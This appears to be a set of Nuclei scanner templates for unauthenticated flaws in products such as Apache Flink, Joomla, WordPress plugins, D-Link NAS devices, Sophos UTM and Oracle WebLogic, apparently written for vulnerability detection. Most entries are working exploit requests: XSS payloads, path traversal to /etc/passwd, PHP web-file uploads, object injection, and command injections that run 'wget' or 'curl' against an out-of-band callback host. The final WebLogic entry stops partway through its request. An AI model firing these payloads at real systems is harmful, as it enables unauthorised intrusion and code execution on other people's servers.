# Apache Flink - Remote Code Execution

## Description

- Apache Flink
- severity - critical
- tags - apache,flink,rce,intrusive,unauth

## Requests

### Step - 1

```
POST /jars/upload HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data;boundary=8ce4b16b22b58894aa86c421e8759df3

--8ce4b16b22b58894aa86c421e8759df3
Content-Disposition: form-data; name="jarfile";filename="poc.jar"
Content-Type:application/octet-stream

  {{randstr}}
--8ce4b16b22b58894aa86c421e8759df3--

```

### Matchers

**Type - word**

- words
  1. application/json
- part - header
- condition - and

**Type - word**

- words
  1. success
  2. \_poc.jar
- part - body
- condition - and

**Type - status**

- status
  1. 200

---

# RocketChat Live Chat - Unauthenticated Read Access

## Description

- RocketChat Live Chat accepts invalid parameters that could potentially allow unauthenticated access to messages and user tokens.
- severity - high
- tags - rocketchat,unauth

## Requests

### Step - 1

```
POST /api/v1/method.callAnon/cve_exploit HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}
Content-Type: application/json
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8

{"message":"{\"msg\":\"method\",\"method\":\"livechat:registerGuest\",\"params\":[{\"token\":\"cvenucleirocketchat\",\"name\":\"cve-2020-nuclei\",\"email\":\"cve@nuclei.local\"}],\"id\":\"123\"}"}

```

### Step - 2

```
POST /api/v1/method.callAnon/cve_exploit HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}
Content-Type: application/json

{"message":"{\"msg\":\"method\",\"method\":\"livechat:loadHistory\",\"params\":[{\"token\":\"cvenucleirocketchat\",\"rid\":\"GENERAL\"}],\"msg\":\"123\"}"}

```

### Matchers

**Type - word**

- part - body
- words
  1. "{\"msg\":\"result\",\"result\":{\"messages\"
  2. "success":true
- condition - and

**Type - status**

- status
  1. 200

---

# Concrete CMS \<8.5.2 - Cross-Site Scripting

## Description

- Concrete CMS before 8.5.2 contains a cross-site scripting vulnerability in preview_as_user function using cID parameter.
- severity - high
- tags - hackerone,concrete,xss,cms,unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}/ccm/system/panels/page/preview_as_user/preview?cID=">\</iframe>\<svg/onload=alert("{{randstr}}")>

### Matchers

**Type - word**

- part - body
- words
  1. \</iframe>\<svg/onload=alert("{{randstr}}")>

**Type - word**

- part - header
- words
  1. text/html
  2. CONCRETE5
- condition - and

**Type - status**

- status
  1. 200

---

# Under Construction, Coming Soon & Maintenance Mode \< 1.1.2 - Server Side Request Forgery (SSRF)

## Description

- The includes/mc-get_lists.php file used the 'apiKey' POST parameter to create an https URL from it without sanitisation and called it with cURL, leading to a SSRF issue. The issue is exploitable via direct access to the affected file, and ucmm_mc_api AJAX call (available to both authenticated and unauthenticated users).

- severity - high
- tags - ssrf,wp,wp-plugin,wordpress,unauth,wpscan,packetstorm

## Requests

### Step - 1

```
POST /wp-admin/admin-ajax.php HTTP/2
Host: {{Hostname}}
Origin: {{BaseURL}}
Content-Type: application/x-www-form-urlencoded

action=ucmm_mc_api&apiKey=-{{interactsh-url}}%2Ftest%2Ftest%2Ftest%3Fkey1%3Dval1%26dummy%3D

```

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. http

---

# WordPress Age Gate \<2.13.5 - Open Redirect

## Description

- WordPress Age Gate plugin before 2.13.5 contains an open redirect vulnerability via the \_wp_http_referer parameter after certain actions and after invalid or missing nonces. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.
- severity - low
- tags - agegate,unauth,wpscan,packetstorm,wp-plugin,redirect,wordpress,wp

## Requests

- Method - POST
- Method - POST

### URL

- {{BaseURL}}/wp-admin/admin-post.php
  - age_gate%5Bd%5D=10&age_gate%5Bm%5D=10&age_gate%5By%5D=1990&age_gate%5Bremember%5D=1&age_gate%5Bage%5D=TVRnPQ%3D%3D&action=age_gate_submit&age_gate%5Bnonce%5D=48f2b89fed&\_wp_http_referer=https://interact.sh

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh\/?(\/|[^.]._)?$

---

# WordPress Duplicator Plugin - Information disclosure

## Description

- Unauthenticated Information disclosure of Duplicator WordPress plugin sensitive files.

- severity - medium
- tags - wordpress,wp,wp-plugin,misconfig,disclosure,unauth,exposure

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/backups-dup-lite/tmp/
- {{BaseURL}}/wp-content/backups-dup-lite

### Matchers

**Type - word**

- part - body
- words
  1. Index of /wp-content/backups-dup-lite/

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress AIT CSV Import Export - Unauthenticated Remote Code Execution

## Description

- The AIT CSV Import/Export plugin \<= 3.0.3 allows unauthenticated remote attackers to upload and execute arbitrary PHP code. The upload-handler does not require authentication, nor validates the uploaded content.

- severity - critical
- tags - wp-plugin,rce,fileupload,unauth,wpscan,msf,wordpress,ait-csv,wp,intrusive

## Requests

### Step - 1

```
POST /wp-content/plugins/ait-csv-import-export/admin/upload-handler.php HTTP/1.1
Host: {{Hostname}}
Accept: */*
Content-Type: multipart/form-data; boundary=------------------------ab360007dbae2de8

--------------------------ab360007dbae2de8
Content-Disposition: form-data; name="file"; filename="{{randstr}}.php"
Content-Type: application/octet-stream

sep=;<?php echo md5('ait-csv-import-export-rce');?>

--------------------------ab360007dbae2de8--

```

### Step - 2

```
GET /wp-content/uploads/{{randstr}}.php HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body
- words
  1. fe394b60dc324c3bac3060d600ad4349

**Type - status**

- status
  1. 200

---

# WordPress Blogroll Fun-Show Last Post and Last Update Time 0.8.4 - Cross-Site Scripting

## Description

- WordPress Plugin Blogroll Fun-Show Last Post and Last Update Time 0.8.4 and possibly prior versions are prone to a cross-site scripting vulnerability because of a failure to properly sanitize user-supplied input. An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

- severity - high
- tags - wordpress,wp-plugin,xss,unauth,wp

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/blogroll-fun/blogroll.php?k=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E

### Matchers

**Type - word**

- part - body
- words
  1. Got: \<script>alert(document.domain)\</script>\<br>

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# Social Metrics Tracker \<= 1.6.8 - Unauthorised Data Export

## Description

- The lack of proper authorisation when exporting data from the plugin could allow unauthenticated users to get information about the posts and page of the blog, including their author's username and email.

- severity - medium
- tags - wordpress,wp-plugin,wp,unauth,wpscan

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-admin/admin-ajax.php?page=social-metrics-tracker-export&smt_download_export_file=1

### Matchers

**Type - word**

- part - body
- words
  1. Main URL to Post

**Type - status**

- status
  1. 200

---

# Cisco Unified Call Manager Username Enumeration

- severity - medium
- tags - cisco,cucm,unauth,enum

## Requests

- Method - GET

### URL

- {{BaseURL}}/cucm-uds/users

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. \<userName>
  2. \<lastName>
  3. \<phoneNumber>
- condition - and

**Type - dsl**

- dsl
  1. contains(tolower(content_type), 'application/xml')
  2. contains(tolower(content_type), 'text/xml')
- condition - or

---

# Royal Event Management System - Stored Cross-Site Scripting

## Description

- Royal Event Management System contains a stored cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

- severity - high
- tags - xss,unauthenticated,cms,royalevent,packetstorm

## Requests

### Step - 1

```
POST /royal_event/companyprofile.php HTTP/1.1
Host: {{Hostname}}

companyname=%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E&regno=test&companyaddress=&companyemail=&country=India&mobilenumber=1234567899&submit=

```

### Matchers

**Type - word**

- words
  1. value=">\<script>alert(document.domain)\</script>" >

**Type - status**

- status
  1. 302

---

# Qizhi Fortressaircraft Unauthorized Access

- severity - high
- tags - qizhi,fortressaircraft,unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm

### Matchers

**Type - word**

- part - body
- words
  1. 错误的 id
  2. 审计管理员
  3. 事件审计
- condition - and

**Type - status**

- status
  1. 200

---

# Unauthenticated Spark REST API

## Description

- The Spark product's REST API interface allows access to unauthenticated users.
- severity - critical
- tags - spark,unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}/v1/submissions

### Matchers

**Type - status**

- status
  1. 400

**Type - word**

- words
  1. Missing an action
  2. serverSparkVersion
- part - body
- condition - and

---

# Unauthenticated Gloo UI

- severity - high
- tags - unauth,gloo

## Requests

- Method - GET

### URL

- {{BaseURL}}/fed.rpc.solo.io.GlooInstanceApi/ListClusterDetails

### Matchers

**Type - word**

- words
  1. gke-remote
- part - body

**Type - word**

- words
  1. application/grpc-web+proto
- part - header

**Type - status**

- status
  1. 200

---

# YesWiki \<2022-07-07 - Cross-Site Scripting

## Description

- YesWiki before 2022-07-07 contains a cross-site scripting vulnerability via the id parameter in the AccueiL URL.

- severity - high
- tags - yeswiki,unauth,huntr,cve,cve2022,xss

## Requests

- Method - GET

### URL

- {{BaseURL}}/?PagePrincipale/rss&id=1%27%3Cscript%3Ealert(document.domain)%3C/script%3E

### Matchers

**Type - word**

- part - body
- words
  1. \<script>alert(document.domain)\</script>
  2. Query failed:
- condition - and

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# Pyspider Unauthorized Access

- severity - high
- tags - pyspider,unauth

## Requests

### Step - 1

```
POST /debug/pyspidervulntest/run HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

webdav_mode=false&script=from+pyspider.libs.base_handler+import+*%0Aclass+Handler(BaseHandler)%3A%0A++++def+on_start(self)%3A%0A++++++++print(str(452345672+%2B+567890765))&task=%7B%0A++%22process%22%3A+%7B%0A++++%22callback%22%3A+%22on_start%22%0A++%7D%2C%0A++%22project%22%3A+%22pyspidervulntest%22%2C%0A++%22taskid%22%3A+%22data%3A%2Con_start%22%2C%0A++%22url%22%3A+%22data%3A%2Con_start%22%0A%7D

```

### Matchers

**Type - word**

- part - body
- words
  1. 1020236437

**Type - status**

- status
  1. 200

---

# Hoteldruid Management Panel Access

## Description

- A vulnerability in Hoteldruid Panel allows remote unauthenticated users access to the management portal without authentication.
- severity - high
- tags - hoteldruid,panel,unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}/hoteldruid/inizio.php
- {{BaseURL}}/inizio.php

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- part - body
- words
  1. \<title> HotelDruid \</title>
  2. \<b>INSERT:\</b>
  3. \<b>TABLES:\</b>
- condition - and

---

# Lucee - Cross-Site Scripting

## Description

- Lucee contains a cross-site scripting vulnerability. It allows remote attackers to inject arbitrary JavaScript into the responses returned by the server.
- severity - high
- tags - lucee,xss,unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}/lucees3ezf%3cimg%20src%3da%20onerror%3dalert('{{randstr}}')%3elujb7/admin/imgProcess.cfm
- {{BaseURL}}/lucee/lucees3ezf%3cimg%20src%3da%20onerror%3dalert('{{randstr}}')%3elujb7/admin/imgProcess.cfm

### Matchers

**Type - word**

- words
  1. \<img src=a onerror=alert('{{randstr}}')>
  2. MissingIncludeException
  3. lucee-err
- part - body
- condition - and

---

# OrbiTeam BSCW Server - Local File Inclusion

## Description

- OrbiTeam BSCW Server versions 5.0.x, 5.1.x, 5.2.4 and below, 7.3.x and below, and 7.4.3 and below are vulnerable to unauthenticated local file inclusion.

- severity - high
- tags - bscw,orbiteam,lfi,unauth,packetstorm

## Requests

- Method - GET

### URL

- {{BaseURL}}/pub/bscw.cgi/30?op=theme&style_name=../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# Tekon - Unauthenticated Log Leak

## Description

- A vulnerability in Tekon allows remote unauthenticated users to disclose the Log of the remote device
- severity - low
- tags - tekon,exposure,unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}/cgi-bin/log.cgi

### Matchers

**Type - word**

- part - body
- words
  1. -- Logs begin at
  2. end at
- condition - and

**Type - word**

- part - header
- words
  1. text/plain

**Type - status**

- status
  1. 200

---

# Unauthenticated Spark WebUI

- severity - medium
- tags - unauth,vulhub,spark

## Requests

- Method - GET

### URL

- {{BaseURL}}

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. \<title>Spark Master at spark://
  2. \<strong>URL:\</strong>
- part - body
- condition - and

---

# Seowon 130-SLC router - Remote Code Execution

## Description

- Seowon 130-SLC router lets remote attackers execute commands without authentication as admin users via the router ip & Port(if available) in the request.

- severity - critical
- tags - unauth,iot,edb,rce,seowon,router

## Requests

### Step - 1

```
POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Referer: {{BaseURL}}/diagnostic.html?t=201701020919
Cookie: product=cpe; cpe_buildTime=201701020919; vendor=mobinnet; connType=lte; cpe_multiPdnEnable=1; cpe_lang=en; cpe_voip=0; cpe_cwmpc=1; cpe_snmp=1; filesharing=0; cpe_switchEnable=0; cpe_IPv6Enable=0; cpe_foc=0; cpe_vpn=1; cpe_httpsEnable=0; cpe_internetMTUEnable=0; cpe_opmode=lte; sessionTime=1631653385102; cpe_login=admin

Command=Diagnostic&traceMode=trace&reportIpOnly=0&pingPktSize=56&pingTimeout=30&pingCount=4&ipAddr=&maxTTLCnt=30&queriesCnt=;cat /etc/passwd&reportIpOnlyCheckbox=on&btnApply=Apply&T=1631653402928

```

### Matchers

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Carel pCOWeb HVAC BACnet Gateway 2.1.0 - Local File Inclusion

## Description

- Carel pCOWeb HVAC BACnet Gateway 2.1.0 is vulnerable to local file inclusion because of input passed through the 'file' GET parameter through the 'logdownload.cgi' Bash script is not properly verified before being used to download log files. This can be exploited to disclose the contents of arbitrary and sensitive files via directory traversal attacks.
- severity - high
- tags - carel,lfi,traversal,unauth,bacnet

## Requests

- Method - GET

### URL

- {{BaseURL}}/usr-cgi/logdownload.cgi?file=../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

---

# Joomla! CMS \<=3.4.6 - Remote Code Execution

## Description

- Joomla! CMS 3.0.0 through the 3.4.6 release contains an unauthenticated PHP object injection that leads to remote code execution.

- severity - critical
- tags - joomla,rce,unauth,php,cms,objectinjection

## Requests

### Step - 1

```
GET / HTTP/1.1
Host: {{Hostname}}

```

### Step - 2

```
POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username=%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0&password=AAA%22%3Bs%3A11%3A%22maonnalezzo%22%3BO%3A21%3A%22JDatabaseDriverMysqli%22%3A3%3A%7Bs%3A4%3A%22%5C0%5C0%5C0a%22%3BO%3A17%3A%22JSimplepieFactory%22%3A0%3A%7B%7Ds%3A21%3A%22%5C0%5C0%5C0disconnectHandlers%22%3Ba%3A1%3A%7Bi%3A0%3Ba%3A2%3A%7Bi%3A0%3BO%3A9%3A%22SimplePie%22%3A5%3A%7Bs%3A8%3A%22sanitize%22%3BO%3A20%3A%22JDatabaseDriverMysql%22%3A0%3A%7B%7Ds%3A5%3A%22cache%22%3Bb%3A1%3Bs%3A19%3A%22cache_name_function%22%3Bs%3A7%3A%22print_r%22%3Bs%3A10%3A%22javascript%22%3Bi%3A9999%3Bs%3A8%3A%22feed_url%22%3Bs%3A40%3A%22http%3A%2F%2Frusty.jooml%2F%3Bpkwxhxqxmdkkmscotwvh%22%3B%7Di%3A1%3Bs%3A4%3A%22init%22%3B%7D%7Ds%3A13%3A%22%5C0%5C0%5C0connection%22%3Bi%3A1%3B%7Ds%3A6%3A%22return%22%3Bs%3A102%3A&option=com_users&task=user.login&{{csrf}}=1

```

### Matchers

**Type - word**

- part - body
- words
  1. http://rusty.jooml/;pkwxhxqxmdkkmscotwvh
  2. Failed to decode session object
- condition - and

### Extractors

**Type - regex**

- name - csrf
- part - body
- group - 1
- regex
  1. \<input type="hidden" name="([0-9a-z]{32})" value="1"
- internal - True

---

# PostgreSQL - pgAdmin Dasboard Exposure

- severity - info
- tags - unauth,pgadmin,postgres,panel

## Requests

- Method - GET

### URL

- {{BaseURL}}/browser/

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. PGADMIN_LANGUAGE=
- part - header

**Type - word**

- words
  1. \<title>pgAdmin
- part - body

---

# Epson Projector Login Panel - Detect

## Description

- Epson Projector login panel was detected.
- severity - info
- tags - iot,projector,panel,unauth,epson

## Requests

- Method - GET

### URL

- {{BaseURL}}/

### Matchers

**Type - word**

- part - body
- words
  1. cgi-bin/webconf.exe?page=1
  2. \<title>Web Control\</title>
- condition - and

**Type - status**

- status
  1. 200

---

# SecuritySpy Camera Detect

- severity - medium
- tags - unauth,iot,securityspy,panel,camera

## Requests

- Method - GET

### URL

- {{BaseURL}}

### Matchers

**Type - word**

- words
  1. \<title>SecuritySpy\</title>
- part - body

**Type - status**

- status
  1. 200

---

# Exposed Neo4j Browser

- severity - low
- tags - neo4j,exposure,unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}/browser/

### Matchers

**Type - word**

- part - body
- words
  1. \<title>Neo4j Browser\</title>

**Type - status**

- status
  1. 200

---

# Unauthenticated FRP

- severity - info
- tags - frp,unauth,panel

## Requests

- Method - GET

### URL

- {{BaseURL}}/static/

### Matchers

**Type - word**

- words
  1. \<title>frps dashboard\</title>
- part - body

**Type - status**

- status
  1. 200

---

# Selenium Grid Dashboard

- severity - unknown
- tags - panel,unauth,selenium

## Requests

- Method - GET

### URL

- {{BaseURL}}/ui/index.html

### Matchers

**Type - word**

- part - body
- words
  1. \<title>Selenium Grid\</title>

**Type - status**

- status
  1. 200

---

# Beego Admin Dashboard Panel- Detect

## Description

- Beego Admin Dashboard panel was detected.
- severity - medium
- tags - panel,beego,unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}/listconf?command=conf

### Matchers

**Type - word**

- part - body
- words
  1. Welcome to Beego Admin Dashboard
  2. Configurations
- condition - and

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# Unauth SmartPing Dashboard

- severity - low
- tags - panel,misconfig,unauth,smartping

## Requests

- Method - GET

### URL

- {{BaseURL}}/config.html

### Matchers

**Type - word**

- part - body
- words
  1. SmartPing Dashboard

**Type - status**

- status
  1. 200

---

# Epson Device Unauthorized Access Detect

## Description

- A publicly available Epson device panel (printer, scanner, etc.) was detected.
- severity - info
- tags - iot,printer,panel,unauth,epson,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/PRESENTATION/EPSONCONNECT

### Matchers

**Type - word**

- words
  1. Epson Connect
  2. /IMAGE/EPSONLOGO.PNG
- condition - and

**Type - status**

- status
  1. 200

### Extractors

**Type - regex**

- part - body
- group - 1
- regex
  1. \<title>([A-Z-0-9]+) Series\</title>

---

# Epson Printer

## Description

- An Epson printer web panel was discovered.
- severity - info
- tags - panel,unauth,epson,edb,iot,printer

## Requests

- Method - GET

### URL

- {{BaseURL}}/cgi-bin/home

### Matchers

**Type - word**

- words
  1. Epson Web Control
  2. Basic Control
  3. Advanced
- condition - and

**Type - status**

- status
  1. 200

---

# sidekiq-dashboard

- severity - medium
- tags - unauth,panel,sidekiq

## Requests

- Method - GET

### URL

- {{BaseURL}}/sidekiq

### Matchers

**Type - word**

- words
  1. \<title>Sidekiq\</title>
- part - body

**Type - status**

- status
  1. 200

---

# Redis Server - Unauthenticated Access

## Description

- Redis server without any required authentication was discovered.
- severity - high
- tags - network,redis,unauth

---

# Apache ZooKeeper - Unauthenticated Access

## Description

- Apache ZooKeeper was able to be accessed without any required authentication.
- severity - high
- tags - network,zookeeper,unauth

---

# ClickHouse - Unauthorized Access

## Description

- ClickHouse was able to be accessed with no required authentication in place.
- severity - high
- tags - network,clickhouse,unauth

---

# ClamAV Server - Unauthenticated Access

## Description

- ClamAV server 0.99.2, and possibly other previous versions, allow the execution
  of dangerous service commands without authentication. Specifically, the command 'SCAN'
  may be used to list system files and the command 'SHUTDOWN' shut downs the service.

- severity - high
- tags - network,clamav,unauth,seclists

---

# TiDB - Unauthenticated Access

## Description

- TiDB server was able to be accessed because no authentication was required.
- severity - high
- tags - network,tidb,unauth

---

# MongoDB - Unauthenticated Access

## Description

- MongoDB was able to be accessed with no password. Note that MongoDB does not require a password by default.
- severity - high
- tags - network,mongodb,unauth

---

# H5S CONSOLE - Unauthorized Access

## Description

- H5S CONSOLE is susceptible to an unauthorized access vulnerability.
- severity - medium
- tags - cnvd,cnvd2020,h5s,unauth,h5sconsole

## Requests

- Method - GET

### URL

- {{BaseURL}}/api/v1/GetSrc
- {{BaseURL}}/api/v1/GetDevice

### Matchers

**Type - word**

- part - body
- words
  1. strUser
  2. strPasswd
- condition - and

**Type - word**

- part - body
- words
  1. H5_AUTO
  2. H5_DEV
- condition - or

**Type - word**

- part - header
- words
  1. application/json

**Type - status**

- status
  1. 200

---

# Brother Printer

- severity - medium
- tags - iot,printer,unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}/net/net/net.html

### Matchers

**Type - word**

- words
  1. Brother Industries
  2. Network Status
- condition - and

**Type - status**

- status
  1. 200

---

# Nova Lite \< 1.3.9 - Cross-Site Scripting

## Description

- Nova Lite before 1.3.9 for WordPress is susceptible to reflected cross-site scripting via search.php.
- severity - medium
- tags - wordpress,xss,wp-plugin,wpscan,cve,cve2020,unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}/?s=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E

### Matchers

**Type - word**

- words
  1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**

- words
  1. nova-lite
- part - body

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# TeamPass 2.1.27.36 - Unauthenticated Access

## Description

- TeamPass 2.1.27.36 allows an unauthenticated attacker to retrieve files from the TeamPass web root. This may include backups or LDAP debug files.

- severity - high
- tags - cve,cve2020,teampass,exposure,unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}/files/ldap.debug.txt

### Matchers

**Type - word**

- part - body
- words
  1. Get all LDAP params

**Type - word**

- part - header
- words
  1. text/plain

**Type - status**

- status
  1. 200

---

# Airflow Experimental \<1.10.11 - REST API Auth Bypass

## Description

- Airflow's Experimental API prior 1.10.11 allows all API requests without authentication.

- severity - critical
- tags - packetstorm,cve,cve2020,apache,airflow,unauth,auth-bypass,kev

## Requests

- Method - GET

### URL

- {{BaseURL}}/api/experimental/latest_runs

### Matchers

**Type - word**

- part - body
- words
  1. "dag_run_url":
  2. "dag_id":
  3. "items":
- condition - and

---

# playSMS \<1.4.3 - Remote Code Execution

## Description

- PlaySMS before version 1.4.3 is susceptible to remote code execution because it double processes a server-side template.
- severity - critical
- tags - cve,cve2020,ssti,playsms,rce,unauth,kev

## Requests

### Step - 1

```
GET /index.php?app=main&inc=core_auth&route=login HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}

```

### Step - 2

```
POST /index.php?app=main&inc=core_auth&route=login&op=login HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}
Content-Type: application/x-www-form-urlencoded

X-CSRF-Token={{csrf}}&username=%7B%7B%60echo%20%27CVE-2020-8644%27%20%7C%20rev%60%7D%7D&password=

```

### Matchers

**Type - word**

- part - body
- words
  1. 4468-0202-EVC

**Type - status**

- status
  1. 200

### Extractors

**Type - xpath**

- name - csrf
- part - body
- attribute - value
- internal - True
- xpath
  1. /html/body/div[1]/div/div/table/tbody/tr[2]/td/table/tbody/tr/td/form/input

---

# Sophos UTM Preauth - Remote Code Execution

## Description

- Sophos SG UTMA WebAdmin is susceptible to a remote code execution vulnerability in versions before v9.705 MR5, v9.607 MR7, and v9.511 MR11.
- severity - critical
- tags - cve,cve2020,sophos,rce,oast,unauth,kev

## Requests

### Step - 1

```
POST /var HTTP/1.1
Host: {{Hostname}}
Accept: text/javascript, text/html, application/xml, text/xml, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
X-Prototype-Version: 1.5.1.1
Content-Type: application/json; charset=UTF-8
Origin: {{BaseURL}}
Connection: close
Referer: {{BaseURL}}
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

{"objs": [{"FID": "init"}], "SID": "|wget http://{{interactsh-url}}|", "browser": "gecko_linux", "backend_version": -1, "loc": "", "_cookie": null, "wdebug": 0, "RID": "1629210675639_0.5000855117488202", "current_uuid": "", "ipv6": true}

```

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. http

---

# D-Link DNS-320 - Unauthenticated Remote Code Execution

## Description

- D-Link DNS-320 FW v2.06B01 Revision Ax is susceptible to a command injection vulnerability in a system_mgr.cgi component. The component does not successfully sanitize the value of the HTTP parameters f_ntp_server, which in turn leads to arbitrary command execution.
- severity - critical
- tags - cve,cve2020,dlink,rce,oast,mirai,unauth,router,kev

## Requests

### Step - 1

```
POST /cgi-bin/system_mgr.cgi? HTTP/1.1
Host: {{Hostname}}
Accept: */*

C1=ON&cmd=cgi_ntp_time&f_ntp_server=`wget http://{{interactsh-url}}`

```

### Step - 2

```
POST /cgi-bin/system_mgr.cgi?C1=ON&cmd=cgi_ntp_time&f_ntp_server=`wget http://{{interactsh-url}}` HTTP/1.1
Host: {{Hostname}}
Accept: */*

```

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. http

---

# Monitorr 1.7.6m - Unauthenticated Remote Code Execution

## Description

- Monitorr 1.7.6m is susceptible to a remote code execution vulnerability. Improper input validation and lack of authorization leads to arbitrary file uploads in the web application. An unauthorized attacker with web access to could upload and execute a specially crafted file, leading to remote code execution within the Monitorr.
- severity - critical
- tags - cve2020,monitorr,rce,oast,unauth,edb,cve,fileupload,intrusive

## Requests

### Step - 1

```
POST /assets/php/upload.php HTTP/1.1
Host: {{Hostname}}
Accept-Encoding: gzip, deflate
Accept: text/plain, */*; q=0.01
Connection: close
Accept-Language: en-US,en;q=0.5
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------31046105003900160576454225745
Origin: http://{{Hostname}}
Referer: http://{{Hostname}}

-----------------------------31046105003900160576454225745
Content-Disposition: form-data; name="fileToUpload"; filename="{{randstr}}.php"
Content-Type: image/gif

GIF89a213213123<?php shell_exec("wget -c http://{{interactsh-url}}");

-----------------------------31046105003900160576454225745--

```

### Step - 2

```
GET /assets/data/usrimg/{{tolower("{{randstr}}.php")}} HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. http

---

# TerraMaster TOS - Unauthenticated Remote Command Execution

## Description

- TerraMaster TOS \<= 4.2.06 is susceptible to a remote code execution vulnerability which could allow remote unauthenticated attackers to inject OS commands via /include/makecvs.php via the Event parameter.
- severity - critical
- tags - cve,cve2020,terramaster,rce,oast,mirai,unauth

## Requests

### Step - 1

```
GET /include/makecvs.php?Event=%60wget%20http%3A%2F%2F{{interactsh-url}}%60 HTTP/1.1
Host: {{Hostname}}

```

### Step - 2

```
GET /tos/index.php?explorer/pathList&path=%60wget%20http%3A%2F%2F{{interactsh-url}}%60 HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. http

---

# SAP - Unauthenticated Blind SSRF

## Description

- SAP BusinessObjects Business Intelligence Platform (Web Services) versions - 410, 420, 430, allows an unauthenticated attacker to inject arbitrary values as CMS parameters to perform lookups on the internal network which is otherwise not accessible externally. On successful exploitation, attacker can scan internal network to determine internal infrastructure and gather information for further attacks like remote file inclusion, retrieve server files, bypass firewall and force the vulnerable server to perform malicious requests, resulting in a Server-Side Request Forgery vulnerability.

- severity - medium
- tags - cve,cve2020,sap,ssrf,oast,unauth

## Requests

### Step - 1

```
POST /AdminTools/querybuilder/logon?framework= HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

aps={{interactsh-url}}&usr=anything&pwd=anything&aut=secEnterprise&main_page=ie.jsp&new_pass_page=newpwdform.jsp&exit_page=logonform.jsp

```

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. dns

**Type - word**

- part - location
- words
  1. {{BaseURL}}/AdminTools/querybuilder/logonform.jsp

---

# Oracle WebLogic Server - Remote Command Execution

## Description

- Oracle WebLogic Server 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0 is susceptible to remote code execution. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised machine without entering necessary credentials. See also CVE-2020-14882, which is addressed in the October 2020 Critical Patch Update.

- severity - critical
- tags - cve,cve2020,rce,oracle,weblogic,unauth,kev

## Requests

### Step - 1

```
@timeout: 10s
POST /console/css/%252e%252e%252fconsole.portal HTTP/1.1
Host: {{Hostname}}
User-Agent: curl/7.79.1
Accept: */*
cmd: curl {{interactsh-url}}
Content-Type: application/x-www-form-urlencoded

